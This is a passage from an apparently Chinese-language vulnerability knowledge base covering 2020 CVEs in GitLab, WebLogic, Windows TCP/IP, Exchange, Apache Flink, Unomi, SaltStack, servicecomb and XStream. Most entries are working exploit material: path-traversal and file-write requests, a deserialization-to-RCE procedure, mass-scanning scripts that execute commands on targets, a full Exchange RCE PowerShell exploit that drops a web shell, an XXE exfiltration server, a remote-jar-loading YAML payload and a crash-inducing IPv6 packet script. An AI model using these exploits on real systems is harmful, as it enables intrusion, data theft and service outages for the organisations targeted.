target.replace(\"https://\",\"\").replace(\"http://\",\"\")+\"_SWNetPerfMon.db\" configFile = open(outputFile,\"w\") configFile.write(leakedDB.text) configFile.close() # encrypted ? https://www.atredis.com/blog/2018/10/24/fun-with-the-solarwinds-orion-platform print(\"[+] SWNetPerfMon.db written to : \" + outputFile ) else: print(\"[-] Failed to download SWNetPerfMon.db target is on newer version\") exit(-1) 参考： https://help.aliyun.com/noticelist/articleid/1060774045.html https://gist.github.com/0xsha/75616ef6f24067c4fb5b320c5dfa4965 https://github.com/jaeles-project/jaeles-signatures/blob/master/cves/solarwinds-lfi-cve-2020-10148.yaml https://forum.ywhack.com/thread-114894-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-10977 Gitlab任意文件读取导致远程命令执行.html":{"url":"Edge_Security/CVE-2020-10977 Gitlab任意文件读取导致远程命令执行.html","title":"CVE-2020-10977 Gitlab任意文件读取导致远程命令执行","keywords":"","body":"CVE-2020-10977 Gitlab任意文件读取导致远程命令执行 任意文件读取 新建两个测试项目 在其中一个project中创建新的issue，在其问题描述中输入下方代码，然后提交 ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd) 创建issue成功后点击move issue，将它移动到test2中 test2中的issue中带了一个password附件 点击下载password附件，用记事本方式打开，发现其内容就是/etc/password的内容 RCE（remote command/code execute） 利用任意文件读取漏洞 下载/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml文件，获取secret_key_base ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml) 下载secrets.yml，获取secret_key_base 在自己的攻击机上搭建一个gitlab环境（详见环境搭建笔记） 将目标机下载下来的secerts.yml覆盖在自己攻击机上/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml （也可以只替换secret_key_base） 使用gitlab-rails console执行以下命令 gitlab-rails console #进入rails console 依次输入： request = ActionDispatch::Request.new(Rails.application.env_config) request.env[\"action_dispatch.cookies_serializer\"] = :marshal cookies = request.cookie_jar erb = ERB.new(\" /tmp/flag` %>\") depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \"@result\", ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie] 获取cookie，构造语句： curl -vvv 'http://192.168.1.86:8888/users/sign_in' -b \"experimentation_subject_id=cookie\" （ps：experimentation_subject_id参数输入rail console获取的cookie值） 通过任意文件读取下载/tmp/flag文件，内容：“flag was here”，说明命令执行成功！ EXP：https://www.exploit-db.com/exploits/48431 参考：https://hackerone.com/reports/827052 来源csdn博客，原文已删。 https://forum.ywhack.com/thread-114698-1-3.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-13935 Apache Tomcat WebSocket 拒绝服务漏洞.html":{"url":"Edge_Security/CVE-2020-13935 Apache Tomcat WebSocket 拒绝服务漏洞.html","title":"CVE-2020-13935 Apache Tomcat WebSocket 拒绝服务漏洞","keywords":"","body":"CVE-2020-13935 Apache Tomcat WebSocket 拒绝服务漏洞 Apache Tomcat中的WebSocket存在安全漏洞，该漏洞源于程序没有正确验证payload的长度。攻击者可利用该漏洞造成拒绝服务（无限循环）。 以下产品及版本受到影响： Apache Tomcat 10.0.0-M1版本至10.0.0-M6版本 9.0.0.M1版本至9.0.36版本 8.5.0版本至8.5.56版本 7.0.27版本至7.0.104版本 漏洞分析：https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/ PoC： https://github.com/RedTeamPentesting/CVE-2020-13935 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-13942 Apache Unomi 远程代码执行.html":{"url":"Edge_Security/CVE-2020-13942 Apache Unomi 远程代码执行.html","title":"CVE-2020-13942 Apache Unomi 远程代码执行","keywords":"","body":"CVE-2020-13942 Apache Unomi 远程代码执行 PoC： {\"filters\":[{\"id\" : \"pyn3rd\",\"filters\": [{\"condition\": {\"parameterValues\": {\"pyn3rd\": \"script::Runtime.getRuntime().exec('open -a Calculator')\"},\"type\":\"profilePropertyCondition\"}}]}],\"sessionId\": \"pyn3rd\"} ref： https://twitter.com/pyn3rd/status/1328920545442680837 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-14815 Oracle Business Intelligence XSS.html":{"url":"Edge_Security/CVE-2020-14815 Oracle Business Intelligence XSS.html","title":"CVE 2020 14815 Oracle Business Intelligence XSS","keywords":"","body":"CVE-2020-14815 Oracle Business Intelligence XSS CVE-2020-14815 Oracle Business Intelligence XSS PoC： https://target[.]com/bi-security-login/login.jsp?msi=false&redirect=\"> ref： https://www.oracle.com/security-alerts/cpuoct2020.html https://twitter.com/HackerOn2Wheels/status/1326927875279380480 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/cve-2020-14882-weblogic越权绕过登录RCE批量检测.html":{"url":"Edge_Security/cve-2020-14882-weblogic越权绕过登录RCE批量检测.html","title":"cve-2020-14882-weblogic越权绕过登录RCE批量检测","keywords":"","body":"cve-2020-14882-weblogic越权绕过登录RCE批量检测 漏洞详情 未经身份验证的远程攻击者可通过构造特殊的 HTTP GET 请求，结合 CVE-2020-14883 漏洞进行利用，利用此漏洞可在未经身份验证的情况下直接接管 WebLogic Server Console ，并执行任意代码，利用门槛低，漏洞等级高危。 影响版本 Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.3，12.2.1.4，14.1.1.0。 漏洞地址 /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29 修复建议 安装官方最新补丁进行升级： https://www.oracle.com/security-alerts/cpuapr2020.html 批量检测 备注：遵守网络安全法，只给出核心代码，其中调试的时候遇到一个坑，服务器返回无法解析，需要调用python3里面的http_vsn_str用http1.0格式发包才能解决 import http.client http.client.HTTPConnection._http_vsn = 10 http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0' headers={'Connection':'close', 'cmd':'echo 666' } payloads = [r\"\"\"/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"cmd\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\"\"\"] def http_request(url): try: print(\"Trying:\" + url + ' ' + '[' + str(left) + '/' + str(countLines) + ']') for payload in payloads: try: vulurl = url + payload print(vulurl) r = requests.get(url=vulurl, headers=headers, timeout=10, verify= False) print(r.text) if r.status_code == 200 and '666' in r.text: print(\"\\033[1;40;32m[Vuln] {}\\033[0m\".format(vulurl)) print(r.text) with open(path_out,'a') as f: f.write(vulurl + '\\n') return else: print(\"[-]\" + \"r.status_code:\" + str(r.status_code) + \",\" + \"raise.text:\" + r.text) except Exception as err: print(err) except Exception as err: print(err) via：六六 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-16846 SaltStack远程执行代码漏洞.html":{"url":"Edge_Security/CVE-2020-16846 SaltStack远程执行代码漏洞.html","title":"CVE-2020-16846 SaltStack远程执行代码漏洞","keywords":"","body":"CVE-2020-16846 SaltStack远程执行代码漏洞 PoC： POST /run HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Mozilla/5.0 Accept: application/x-yaml Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 87 token=12312&client=ssh&tgt=pyn3rd&fun=a&roster=qwe&ssh_priv=aaa%26%20open%20-a%20Calculator ref： https://www.saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/ https://forum.ywhack.com/thread-114703-1-4.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-16898 | Windows TCP-IP远程执行代码漏洞 Exploit.html":{"url":"Edge_Security/CVE-2020-16898 | Windows TCP-IP远程执行代码漏洞 Exploit.html","title":"CVE-2020-16898 | Windows TCP-IP远程执行代码漏洞 Exploit","keywords":"","body":"CVE-2020-16898 | Windows TCP/IP远程执行代码漏洞 Exploit CVE-2020-16898 | Windows TCP/IP远程执行代码漏洞 Exploit 受影响的版本 Windows 10、Windows Server的多个版本均受影响。 利用视频：https://vimeo.com/467834951 exploit： #!/usr/bin/env python3 # # Proof-of-Concept / BSOD exploit for CVE-2020-16898 - Windows TCP/IP Remote Code Execution Vulnerability # # Author: Adam 'pi3' Zabrocki # http://pi3.com.pl # from scapy.all import * v6_dst = \"fd12:db80:b052:0:7ca6:e06e:acc1:481b\" v6_src = \"fe80::24f5:a2ff:fe30:8890\" p_test_half = 'A'.encode()*8 + b\"\\x18\\x30\" + b\"\\xFF\\x18\" p_test = p_test_half + 'A'.encode()*4 c = ICMPv6NDOptEFA(); e = ICMPv6NDOptRDNSS() e.len = 21 e.dns = [ \"AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA\", \"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\", \"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\", \"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\", \"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\", \"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\", \"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\", \"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\", \"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\", \"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\" ] pkt = ICMPv6ND_RA() / ICMPv6NDOptRDNSS(len=8) / \\ Raw(load='A'.encode()*16*2 + p_test_half + b\"\\x18\\xa0\"*6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e p_test_frag = IPv6(dst=v6_dst, src=v6_src, hlim=255)/ \\ IPv6ExtHdrFragment()/pkt l=fragment6(p_test_frag, 200) for p in l: send(p) Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-17083 Microsoft Exchange Server 远程执行代码漏洞.html":{"url":"Edge_Security/CVE-2020-17083 Microsoft Exchange Server 远程执行代码漏洞.html","title":"CVE-2020-17083 Microsoft Exchange Server 远程执行代码漏洞","keywords":"","body":"CVE-2020-17083 Microsoft Exchange Server 远程执行代码漏洞 PoC： # Microsoft Exchange Server ExportExchangeCertificate WriteCertiricate File Write Remote Code Execution Vulnerability # Patch: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17083 # CVSS v3: 9.1 (/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C) # # Notes: # # The (ab)user needs the \"Exchange Server Certificates\" role assigned # [PS] C:\\Windows\\system32>New-RoleGroup -Name \"cert users\" -Roles \"Exchange Server Certificates\" -Members \"harryh\" # # Name AssignedRoles RoleAssignments ManagedBy # ---- ------------- --------------- --------- # cert users {Exchange Server Certificates} {Exchange Server Certificates-cert users} {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/Admin} # # # [PS] C:\\Windows\\system32>Get-RoleGroup \"cert users\" | Format-List # # # RunspaceId : a97d7e2c-d036-4bfc-b95c-4fabcb644160 # ManagedBy : {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/Admin} # RoleAssignments : {Exchange Server Certificates-cert users} # Roles : {Exchange Server Certificates} # DisplayName : # ExternalDirectoryObjectId : # Members : {exchangedemo.com/Users/Harry Houdini} # SamAccountName : cert users # Description : # RoleGroupType : Standard # LinkedGroup : # Capabilities : {} # LinkedPartnerGroupId : # LinkedPartnerOrganizationId : # Identity : exchangedemo.com/Microsoft Exchange Security Groups/cert users # IsValid : True # ExchangeVersion : 0.10 (14.0.100.0) # Name : cert users # DistinguishedName : CN=cert users,OU=Microsoft Exchange Security Groups,DC=exchangedemo,DC=com # Guid : 6fb0b860-2cc2-4fe1-9489-d93dbbed8c9f # ObjectCategory : exchangedemo.com/Configuration/Schema/Group # ObjectClass : {top, group} # WhenChanged : 6/12/2020 4:15:54 AM # WhenCreated : 6/12/2020 1:34:51 AM # WhenChangedUTC : 6/11/2020 8:15:54 PM # WhenCreatedUTC : 6/11/2020 5:34:51 PM # OrganizationId : # Id : exchangedemo.com/Microsoft Exchange Security Groups/cert users # OriginatingServer : DEAD01.exchangedemo.com # ObjectState : Changed # # Example: # # PS C:\\Users\\researcher> .\\poc.ps1 -server WIN-0K4AOM2JIN6.exchangedemo.com -usr harryh@exchangedemo.com -pwd user123### -cmd mspaint # (+) targeting WIN-0K4AOM2JIN6.exchangedemo.com with harryh@exchangedemo.com:user123### # (+) wrote to target file C:/Windows/Temp/rXq1U2tD.hta # (+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/4VFQwc7W.aspx # (+) shell written, executing command... # (+) executed mspaint as SYSTEM! # PS C:\\Users\\researcher> param ( [Parameter(Mandatory=$true)][string]$server, [Parameter(Mandatory=$true)][string]$usr, [Parameter(Mandatory=$true)][string]$pwd, [string]$cmd = \"mspaint\" ) Function Get-RandomAlphanumericString { [CmdletBinding()] Param ( [int] $length = 8 ) Process{ Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length | % {[char]$_}) ) } } function Writebad-File{ Param ( [string] $fn, [string] $content, [System.Management.Automation.Runspaces.PSSession] $session ) $selector = Get-RandomAlphanumericString Invoke-Command -Session $session -ScriptBlock { New-ExchangeCertificate -BinaryEncoded -GenerateRequest -SubjectName \"c=$Using:selector,o=$Using:content,cn=si\" } | Out-Null $thumb = Invoke-Command -Session $session -ScriptBlock { Get-ExchangeCertificate } | Where-Object -Property Subject -like \"*c=$selector*\" | select-object -Expand Thumbprint # this is where the file write is for this bug Invoke-Command -Session $session -ScriptBlock { Export-ExchangeCertificate -Thumbprint $Using:thumb -FileName $Using:fn -BinaryEncoded; } | Out-Null } function Exploit-Exchange { Param ( [string] $server, [string] $usr, [string] $pwd, [string] $cmd ) \"(+) targeting $server with ${usr}:$pwd\" $securepwd = ConvertTo-SecureString $pwd -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($usr, $securepwd) $s = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://$server/PowerShell/ -Authentication Kerberos -Credential $creds $hta = Get-RandomAlphanumericString $aspx = Get-RandomAlphanumericString # write a hta file with commands Writebad-File -fn \"C:/Windows/Temp/$hta.hta\" -content \"new ActiveXObject('WScript.Shell').Exec('cmd /c $cmd')\" -session $s \"(+) wrote to target file C:/Windows/Temp/$hta.hta\" # write aspx file Writebad-File -fn \"C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/$aspx.aspx\" -content \"\" -session $s \"(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/$aspx.aspx\" \"(+) shell written, executing command...\" $b = @{ destination = \"https://$server/ecp/$aspx.aspx?GET=C:/Windows/Temp/$hta.hta\" flags = '' username = $usr password = $pwd } $r = Invoke-WebRequest \"https://$server/owa/auth.owa\" -SessionVariable 'websess' -Body $b -Method 'POST' | Select-Object -Expand Forms if ([string]::IsNullOrWhiteSpace($r)) { \"(+) executed $cmd as SYSTEM!\" } else { \"(-) exploit failed\" } } Get-PSSession | Remove-PSSession Exploit-Exchange -server $server -usr $usr -pwd $pwd -cmd $cmd ref： https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17083 https://srcincite.io/pocs/cve-2020-17083.ps1.txt https://forum.ywhack.com/thread-114699-1-5.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-17143 Microsoft Exchange 信息泄露漏洞 PoC.html":{"url":"Edge_Security/CVE-2020-17143 Microsoft Exchange 信息泄露漏洞 PoC.html","title":"CVE-2020-17143 Microsoft Exchange 信息泄露漏洞 PoC","keywords":"","body":"CVE-2020-17143 Microsoft Exchange 信息泄露漏洞 PoC 此漏洞使远程攻击者可以披露有关受影响的Exchange Server安装的信息。利用身份验证才能利用此漏洞。 特定缺陷存在于GetWacIframeUrlForOneDrive服务命令的处理中。造成此问题的原因是缺乏对用户提供的xml的正确验证。攻击者可以利用此漏洞在SYSTEM上下文中披露信息。 Microsoft已发布更新来纠正此漏洞。可以在以下位置找到更多详细信息：https : //portal.msrc.microsoft.com/security-guidance/advisory/CVE-2020-17143 #!/usr/bin/env python3 import re import sys import urllib3 import requests from threading import Thread from http.server import BaseHTTPRequestHandler, HTTPServer urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) class xxe(BaseHTTPRequestHandler): def log_message(self, format, *args): return def _set_response(self, d): self.send_response(200) self.send_header('Content-type', 'application/xml') self.send_header('Content-Length', len(d)) self.end_headers() def do_GET(self): if \"leaked\" in self.path: print(\"(+) stolen: %s\" % self.path) message = \" ]]>\" self._set_response(message) self.wfile.write(message.encode('utf-8')) self.wfile.write('\\n'.encode('utf-8')) elif \"poc.dtd\" in self.path: print(\"(+) triggered xxe in exchange server!\") message = \"\"\" '> %%param1; %%external;\"\"\" % (host, int(port)) self._set_response(message) self.wfile.write(message.encode('utf-8')) self.wfile.write('\\n'.encode('utf-8')) elif \"poc.xml\" in self.path: d = \"\"\" \"> %%dtd; ]>\"\"\" % (file, host, int(port)) self._set_response(d) self.wfile.write(d.encode('utf-8')) self.wfile.write('\\n'.encode('utf-8')) return def main(t, usr, pwd, port): server = HTTPServer(('0.0.0.0', port), xxe) handlerthr = Thread(target=server.serve_forever, args=()) handlerthr.daemon = True handlerthr.start() s = requests.Session() d = { \"destination\" : \"https://%s/owa\" % t, \"flags\" : \"\", \"username\" : usr, \"password\" : pwd } s.post(\"https://%s/owa/auth.owa\" % t, data=d, verify=False) h = { \"X-OWA-UrlPostData\" : '{\"request\":{\"DocumentUrl\":\"\",\"EndPointUrl\":\"http://%s:%d/poc.xml\"}}' % (host, port), \"Action\" : \"GetWacIframeUrlForOneDrive\" } r = s.post(\"https://%s/owa/service.svc\" % t, headers=h, verify=False) assert s.cookies.get(name='X-OWA-CANARY') != None, \"(-) couldn't leak the csrf canary!\" h[\"X-OWA-CANARY\"] = s.cookies.get(name='X-OWA-CANARY') s.post(\"https://%s/owa/service.svc\" % t, headers=h, verify=False) if __name__ == '__main__': if len(sys.argv) != 5: print(\"(+) usage: %s \" % sys.argv[0]) print(\"(+) eg: %s 192.168.75.142 harryh@exchangedemo.com:user123# 192.168.75.1:9090 \\\"C:/Users/harryh/secrets.txt\\\"\" % sys.argv[0]) sys.exit(-1) trgt = sys.argv[1] assert \":\" in sys.argv[2], \"(-) you need a user and password!\" usr = sys.argv[2].split(\":\")[0] pwd = sys.argv[2].split(\":\")[1] host = sys.argv[3] port = 9090 file = sys.argv[4] if \":\" in sys.argv[3]: host = sys.argv[3].split(\":\")[0] port = sys.argv[3].split(\":\")[1] assert port.isdigit(), \"(-) not a port number!\" main(trgt, usr, pwd, int(port)) ref： https://nvd.nist.gov/vuln/detail/CVE-2020-17143 https://srcincite.io/advisories/src-2020-0030/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-17144 Exchange2010 反序列化RCE.html":{"url":"Edge_Security/CVE-2020-17144 Exchange2010 反序列化RCE.html","title":"CVE-2020-17144 Exchange2010 反序列化RCE","keywords":"","body":"CVE-2020-17144 Exchange2010 反序列化RCE 和CVE-2018-8302、CVE-2020-0688类似，CVE-2020-17144同属需登录后利用的反序列化漏洞，但仅影响Exchange2010服务器。 与CVE-2020-0688不同，由于漏洞本身有趣的成因和触发条件，在利用时无需明文密码，只要具备NTHash即可成功，在利用方式上会相对更加灵活。同时，存在漏洞的功能点本身具备持久化功能，利用成功后将直接进行持久化行为，在不修复漏洞的情况下将永远存在，其危害性和隐蔽性远大于CVE-2020-0688 internal bool LoadModel(out LearningModel learningModel, out MessageTransformer messageTransformer, bool parseFai) { ... return DeserializeModelFAI(userConfiguration, out learningModel, out messageTransformer); ... } DeserializeModelFAI 直接将用户可空的个人配置作为参数传入造成RCE CVE-2020-17144-EXP 条件: Exchange2010; 普通用户 默认用法(写webshell): CVE-2020-17144-EXP.exe mail.example.com user pass 执行命令 & 端口复用: 修改ExploitClass.cs 参考 @zcgonvh https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&mid=2247483712&idx=1&sn=0b2cc3c9692f5c58a4eeb246d4b392fc&chksm=eaa5bb60ddd23276baf4cfd3fc59ca847c28f350c65ef98a17d49bc9944d653fad95dec4fd14&mpshare=1&scene=1&srcid=1209jtbQLVJIgr3VT0Ut1TM9&sharer_sharetime=1607483575995&sharer_shareid=dc9cecc79ba34e4bbb700a43a16153fd#rd ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2010); service.Credentials = new WebCredentials(\"zcgonvh\",\"P@ssw0rd!\"); service.Url = new Uri(\"https://target/ews/Exchange.asmx\"); { byte[] data = EVIL-SERIALIZED-BUFFER; UserConfiguration u = null; Folder folder = Folder.Bind(service, WellKnownFolderName.Inbox); u = new UserConfiguration(service); u.BinaryData = data; u.Save(\"MRM.AutoTag.Model\", folder.Id); } ref: https://github.com/Airboi/CVE-2020-17144-EXP https://mp.weixin.qq.com/s/nVtE-OFoO076x6T0147AMw 陈师傅 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-17518 Apache Flink 任意文件写入.html":{"url":"Edge_Security/CVE-2020-17518 Apache Flink 任意文件写入.html","title":"CVE-2020-17518 Apache Flink 任意文件写入","keywords":"","body":"CVE-2020-17518 Apache Flink 任意文件写入 影响范围 Apache Flink 1.5.1 ~ 1.11.2 FOFA： app=\"APACHE-Flink\" POST /jars/upload HTTP/1.1 Host: localhost:8081 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y Content-Length: 201 ------WebKitFormBoundaryoZ8meKnrrso89R6Y Content-Disposition: form-data; name=\"jarfile\"; filename=\"../../../../../../tmp/ywhack.txt\" forum.ywhack.com ------WebKitFormBoundaryoZ8meKnrrso89R6Y-- ref https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518 https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-17519 Apache Flink 任意文件读取.html":{"url":"Edge_Security/CVE-2020-17519 Apache Flink 任意文件读取.html","title":"CVE-2020-17519 Apache Flink 任意文件读取","keywords":"","body":"CVE-2020-17519 Apache Flink 任意文件读取 影响范围 Apache Flink 1.5.1 ~ 1.11.2 FOFA： app=\"APACHE-Flink\" PoC： /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd 批量CVE-2020-17519.py： #!/usr/bin/env python # coding:utf-8 # author:B1anda0 #affected versions are Apache Flink 1.11.0-1.11.2 import requests,sys,colorama from colorama import * init(autoreset=True) banner='''\\033[1;33;40m _______ ________ ___ ___ ___ ___ __ ______ _____ __ ___ / ____\\ \\ / / ____| |__ \\ / _ \\__ \\ / _ \\ /_ |____ | ____/_ |/ _ \\ | | \\ \\ / /| |__ ______ ) | | | | ) | | | |______| | / /| |__ | | (_) | | | \\ \\/ / | __|______/ /| | | |/ /| | | |______| | / / |___ \\ | |\\__, | | |____ \\ / | |____ / /_| |_| / /_| |_| | | | / / ___) || | / / \\_____| \\/ |______| |____|\\___/____|\\___/ |_|/_/ |____/ |_| /_/ ''' def verify(): headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\"} payload= '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd' poc=urls+payload try: requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告 response=requests.get(poc,headers=headers,timeout=15,verify=False) if response.status_code==200 and \"root:x\" in response.content: print(u'\\033[1;31;40m[+]{} is apache flink directory traversal vulnerability'.format(urls)) print(response.content) #将漏洞地址输出在Vul.txt中 f=open('./vul.txt','a') f.write(urls) f.write('\\n') else: print('\\033[1;32;40m[-]{} None'.format(urls)) except: print('{} request timeout'.format(urls)) if __name__ == '__main__': print (banner) if len(sys.argv)!=2: print('Example:python CVE-2020-17519.py urls.txt') else: file = open(sys.argv[1]) for url in file.readlines(): urls=url.strip() if urls[-1]=='/': urls=urls[:-1] verify() print ('Check Over') ref： https://help.aliyun.com/noticelist/articleid/1060777426.html https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519 https://forum.ywhack.com/thread-114923-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-17532 Apache servicecomb-java-chassis Yaml 反序列化漏洞.html":{"url":"Edge_Security/CVE-2020-17532 Apache servicecomb-java-chassis Yaml 反序列化漏洞.html","title":"CVE-2020-17532 Apache servicecomb-java-chassis Yaml 反序列化漏洞","keywords":"","body":"CVE-2020-17532 Apache servicecomb-java-chassis Yaml 反序列化漏洞 在servicecomb-java-chassis中启用处理程序-路由器组件时，经过身份验证的用户可能会注入一些数据并导致任意代码执行。 commit： https://github.com/apache/servicecomb-java-chassis/commit/839a52e27c754cb5ce14f20063902f21065bd26c 影响版本： PoC： !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1/\"]]]] !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://artsploit.com/yaml-payload.jar\"] ]] ] ref： https://github.com/apache/servicecomb-java-chassis/commit/839a52e27c754cb5ce14f20063902f21065bd26c https://seclists.org/oss-sec/2021/q1/60 https://forum.ywhack.com/thread-115020-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-26258 XStream SSRF.html":{"url":"Edge_Security/CVE-2020-26258 XStream SSRF.html","title":"CVE 2020 26258 X Stream SSRF","keywords":"","body":"CVE-2020-26258 XStream SSRF PoC： 0 http://localhost:8080/internal/: 0 test XStream xstream = new XStream(); xstream.fromXML(xml); CVE_2020_26258.java import com.thoughtworks.xstream.XStream; /* CVE-2020-26258: A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams from an arbitrary URL referencing a resource in an intranet or the local host. All versions until and including version 1.4.14 https://x-stream.github.io/CVE-2020-26258.html Security framework of XStream not explicitly initialized, using predefined black list on your own risk. */ public class CVE_2020_26258 { public static void main(String[] args) { String ssrf_xml = \"\\n\" + \" \\n\" + \" \\n\" + \" 0\\n\" + \" \\n\" + \" \\n\" + \" \\n\" + \" http://localhost:8989/internal/:\\n\" + \" \\n\" + \" \\n\" + \" \\n\" + \" 0\\n\" + \" \\n\" + \" \\n\" + \" test\\n\" + \" \\n\" + \"\"; XStream xstream = new XStream(); xstream.fromXML(ssrf_xml); } } ref： https://raw.githubusercontent.com/jas502n/CVE-2020-26259/main/CVE_2020_26258.java Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/CVE-2020-26259 XStream 任意文件删除.html":{"url":"Edge_Security/CVE-2020-26259 XStream 任意文件删除.html","title":"CVE-2020-26259 XStream 任意文件删除","keywords":"","body":"CVE-2020-26259 XStream 任意文件删除 PoC： 0 text/plain /etc/hosts 0 test XStream xstream = new XStream(); xstream.fromXML(xml); https://x-stream.github.io/CVE-2020-26259.html CVE_2020_26259.java: import com.thoughtworks.xstream.XStream; /* CVE-2020-26259: XStream is vulnerable to an Arbitrary File Deletion on the local host when unmarshalling as long as the executing process has sufficient rights. https://x-stream.github.io/CVE-2020-26259.html Security framework of XStream not explicitly initialized, using predefined black list on your own risk. */ public class CVE_2020_26259 { public static void main(String[] args) { String xml_poc = \"\\n\" + \" \\n\" + \" \\n\" + \" 0\\n\" + \" \\n\" + \" 